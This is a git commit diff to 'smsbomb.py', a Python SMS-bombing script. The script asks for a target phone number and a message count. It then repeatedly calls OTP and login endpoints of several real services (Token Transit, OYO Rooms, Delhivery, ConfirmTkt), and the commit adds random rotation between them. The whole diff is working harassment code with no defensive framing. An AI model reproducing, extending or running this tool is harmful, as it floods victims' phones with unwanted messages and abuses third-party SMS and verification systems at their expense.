68ba65de6e813e46c1c7044492526a4879f6757d
Shivam-Singh <sd.shivam.00@gmail.com>
2021-02-08 11:32:10 +0530

    Update smsbomb.py

--- smsbomb.py
+++ smsbomb.py
@@ -1,5 +1,6 @@
 from tqdm import tqdm
 import requests
+import random
 print("""
      _.-^^---....,,----       
  _--        sms        --__  
@@ -17,12 +18,12 @@ headers = ({'User-Agent':
         'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
 phoneNumber = input("Enter phone number: ")
 phoneNumber = str(phoneNumber)
-url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
+url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber ,"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +str(91) + "&nod=4&phone=" + phoneNumber , "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + phoneNumber, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + phoneNumber]
 numofmsgs = int(input("Enter number of messages to send: "))
 successspamCount = 0
 failspamCount = 0
 for i in tqdm(range(numofmsgs)):
-    resp = requests.get(url)
+    resp = requests.get(random.choice(url))
     if resp.status_code == 200:
         successspamCount = successspamCount + 1
     else:
